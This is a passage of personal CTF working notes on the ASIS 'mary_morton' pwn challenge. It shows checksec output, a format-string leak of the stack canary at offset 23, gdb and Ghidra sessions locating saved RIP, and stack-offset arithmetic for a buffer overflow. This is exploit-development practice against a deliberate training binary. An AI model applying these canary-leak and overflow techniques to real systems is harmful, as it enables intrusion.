@@ -1,0 +1,93 @@
+0xvhp@im0rtal:~/Nightmare/ROP/asisCTF/mary_morton$ /opt/checksec.sh/checksec  --file=mary_morton
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
+Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes     0               2       mary_morton
+0xvhp@im0rtal:~/Nightmare/ROP/asisCTF/mary_morton$
+
+
+we have format string and buffer overflow vulnerabilities
+
+try to leak canary with fromat string- in 64 bits, the last byte of canary is \x00
+
+0xvhp@im0rtal:~/Nightmare/ROP/asisCTF/mary_morton$ ./mary_morton
+Welcome to the battle !
+[Great Fairy] level pwned
+Select your weapon
+1. Stack Bufferoverflow Bug
+2. Format String Bug
+3. Exit the battle
+2
+AAAAAAAA.%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x .%x
+AAAAAAAA.656fcfc0 .7f .dcdd0191 .0 .0 .41414141 .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .2078252e .0 .e88c3500 .656fd090 .4008b8 .dd0c19f0 .656fd188 .656fd178 .400730 .656fd1701.
+
+
+Looks like 23 position...
+Welcome to the battle !
+[Great Fairy] level pwned
+Select your weapon
+1. Stack Bufferoverflow Bug
+2. Format String Bug
+3. Exit the battle
+2
+%23$llx
+60ea68f07fb26400
+
+how i can check???         004008ff 48 89 45 f8     MOV        qword ptr [RBP + canary],RAX
+
+gdb:
+break
+ →   0x4008ff                  mov    QWORD PTR [rbp-0x8], rax
+$rax   : 0xcae8905dfb19f900
+
+when send %23$llx in gdb need to be 0xcae8905dfb19f900
+
+gef➤  c
+Continuing.
+%23$llx
+cae8905dfb19f900
+
+
+how i can control RIP?
+[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
+  0x7fffffffe260 - 0x7fffffffe26a  →   "abcdefgh\n"
+
+gef➤  i f
+Stack level 0, frame at 0x7fffffffe300:
+ rip = 0x4009aa; saved rip = 0x4008ac
+ called by frame at 0x7fffffffe340
+ Arglist at 0x7fffffffe258, args:
+ Locals at 0x7fffffffe258, Previous frame's sp is 0x7fffffffe300
+ Saved registers:
+  rbp at 0x7fffffffe2f0, rip at 0x7fffffffe2f8
+
+0xvhp@im0rtal:~/Nightmare/ROP$ python -c "print 0x7fffffffe2f8-0x7fffffffe260"
+152
+
+                             **************************************************************
+                             *                          FUNCTION                          *
+                             **************************************************************
+                             undefined __stdcall overflow(void)
+             undefined         AL:1           <RETURN>
+             undefined8        RCX:8          size                                    XREF[1]:     00400986(W)  
+             undefined8        Stack[-0x10]:8 canary																	XREF[2]:     00400974(W), 
+                                                                                                   004009c4(R)  
+             undefined1[136]   Stack[-0x98]   input                                   XREF[3]:     0040097a(*), 
+                                                                                                   00400991(*), 
+                                                                                                   004009aa(*)  
+                             overflow                                        XREF[3]:     menu:004008a7(c), 00400bc0, 
+                                                                                          00400cc0(*)  
+        00400960 55              PUSH       RBP
+
+
+152-8(canary)-8(size)=RIP
+RIP=136
+
+
+
+
+[+] In '/home/0xvhp/Nightmare/ROP/asisCTF/mary_morton/mary_morton'(0x400000-0x401000), permission=r-x
+  0x400b2b - 0x400b3a  →   "/bin/cat ./flag"
+
+
+
+
+
